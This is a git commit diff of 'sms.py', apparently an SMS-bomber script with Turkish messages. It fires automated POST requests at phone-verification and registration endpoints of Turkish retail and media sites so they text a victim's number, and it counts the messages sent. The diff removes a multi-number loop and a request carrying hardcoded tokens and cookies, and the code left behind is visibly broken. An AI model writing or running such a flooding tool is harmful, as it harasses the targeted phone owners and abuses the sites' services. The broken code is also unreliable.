8587b12216a79d1a00c02b34967c8c132f46522f
gravey4rd <163690739+gravey4rd@users.noreply.github.com>
2024-03-18 20:02:22 +0300

    my sms.py

--- sms.py
+++ sms.py
@@ -27,25 +27,6 @@ class SendSms():
 
     # dsmartgo.com.tr
     def Dsmartgo(self):
-        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
-        bos_olmayan = len([x for x in liste if x != "bos"])
-        uygulanan_nolar = 0
-        for numara in liste:
-            if numara != "bos":
-                    dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
-        	        "__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
-        	        "IsSubscriber": "true",
-        	        "__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",
-        	        "Mobile": numara,
-                }, cookies={
-        		    "__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",
-        		    "_ga": "GA1.3.1016548678.1638216163",
-        		    "_gat": "1",
-        		    "_gat_gtag_UA_18913632_14": "1",
-        		    "_gid": "GA1.3.1214889554.1638216163",
-        		    "ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",
-        		    "ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
-        	    })
             try:
                 BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()
                 print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> dsmartgo.com.tr")
@@ -62,12 +43,6 @@ class SendSms():
 
     # kigili.com
     def Kigili(self): 
-        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
-        bos_olmayan = len([x for x in liste if x != "bos"])
-        uygulanan_nolar = 0
-        for numara in liste:
-            if numara != "bos":
-                try:
                     kigili = requests.post("https://www.kigili.com/users/registration/", data={
                     "first_name": "Memati",
                     "last_name": "Bas",
@@ -79,18 +54,13 @@ class SendSms():
                     "next": ""
                 })
                     if kigili.status_code == 202:
-                         print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> kigili.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                         print(f"{Fore.LIGHTBLUE_EX} Toplam SMS: {self.adet}  {Style.RESET_ALL}{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> kigili.com ")
                          self.adet += 1
-                         self.toplam_sms += 1
                     else:
                         raise 
                 except :
-                     print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kigili.com "+numara)
-                uygulanan_nolar += 1
-                if uygulanan_nolar == bos_olmayan:
-                    break
-                else:
-                    continue
+                     print(f"{Fore.LIGHTBLUE_EX} Toplam SMS: {self.adet}  {Style.RESET_ALL}{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kigili.com ")
+
         
 
     #kahvedunyasi.com
